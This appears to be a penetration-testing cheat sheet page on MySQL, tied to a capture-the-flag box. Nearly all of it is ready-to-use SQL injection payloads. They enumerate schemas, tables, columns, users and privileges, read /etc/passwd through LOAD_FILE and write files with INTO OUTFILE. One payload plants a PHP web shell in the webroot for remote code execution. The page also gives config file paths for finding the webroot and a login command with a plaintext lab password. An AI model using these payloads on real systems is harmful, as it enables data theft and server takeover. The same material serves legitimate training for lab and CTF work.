---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# MySQL (3306)

## Usage

{% tabs %}
{% tab title="Connect" %}
```bash
mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n##
```
{% endtab %}
{% endtabs %}

For an example of MySQL usage see [Devvortex](../../boxes/easy/devvortex.md).

## SQLi

{% hint style="info" %}
The `INFORMATION_SCHEMA` database contains metadata about the server databases and tables. Its `SCHEMATA` table contains information about all server databases.
{% endhint %}

{% hint style="danger" %}
On the below commands, the comment at the end includes a space: `-- ! The #` symbol can also be used.
{% endhint %}

{% tabs %}
{% tab title="DBs" %}
```bash
a' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```
{% endtab %}

{% tab title="Current DB" %}
```bash
a' UNION select 1,database(),2,3-- 
```
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```bash
a' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='db1'-- 
```
{% endcode %}
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```bash
a' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='table1'-- 
```
{% endcode %}
{% endtab %}

{% tab title="Data" %}
```bash
a' ' UNION select 1, col1, col2, 4 from db1.table1-- 
```
{% endtab %}
{% endtabs %}

The `FILE` privilege is needed to **READ** files.

{% tabs %}
{% tab title="User (1)" %}
```bash
a' UNION SELECT 1, user(), 3, 4-- 
```
{% endtab %}

{% tab title="User (2)" %}
```bash
a' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```
{% endtab %}

{% tab title="Privileges" %}
{% code overflow="wrap" %}
```bash
a' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="user1"-- 
```
{% endcode %}
{% endtab %}

{% tab title="SUPER_PRIV" %}
```bash
a' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="user1"-- 
```
{% endtab %}

{% tab title="READ" %}
```bash
a' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```
{% endtab %}
{% endtabs %}

To **WRITE** files, in addition to the `FILE` privilege, the `secure_file_priv` variable must be disabled and the user must have write access to the location we want to write to.

| SECURE\_FILE\_PRIV value | PERMISSIONS                             |
| ------------------------ | --------------------------------------- |
|                          | Read files from anywhere.               |
| random\_directory        | Only read from the specified directory. |
| NULL                     | Cannot read/write anywhere.             |

{% tabs %}
{% tab title="SECURE_FILE_PRIV" %}
{% code overflow="wrap" %}
```bash
a' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"--  
```
{% endcode %}
{% endtab %}

{% tab title="WRITE" %}
{% code overflow="wrap" %}
```bash
a' union select 1,'textToBeWritten',3,4 into outfile '/var/www/html/proof.txt'-- 
```
{% endcode %}
{% endtab %}

{% tab title="RCE" %}
{% code overflow="wrap" %}
```bash
a' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```
{% endcode %}
{% endtab %}
{% endtabs %}

To write a webshell, we must know the **webroot**. We can find it is by using `load_file` to read the server configuration:

<table><thead><tr><th width="144">Server</th><th>Directory</th></tr></thead><tbody><tr><td>Apache</td><td>/etc/apache2/apache2.conf</td></tr><tr><td>Nginx</td><td>/etc/nginx/nginx.conf</td></tr><tr><td>ISS</td><td>$WinDir%\System32\Inetsrv\Config\ApplicationHost.config</td></tr></tbody></table>

## Resources

{% tabs %}
{% tab title="Man" %}
{% embed url="https://linux.die.net/man/1/mysql" %}
{% endtab %}

{% tab title="CheatSheet" %}
{% embed url="https://devhints.io/mysql" %}
{% endtab %}
{% endtabs %}
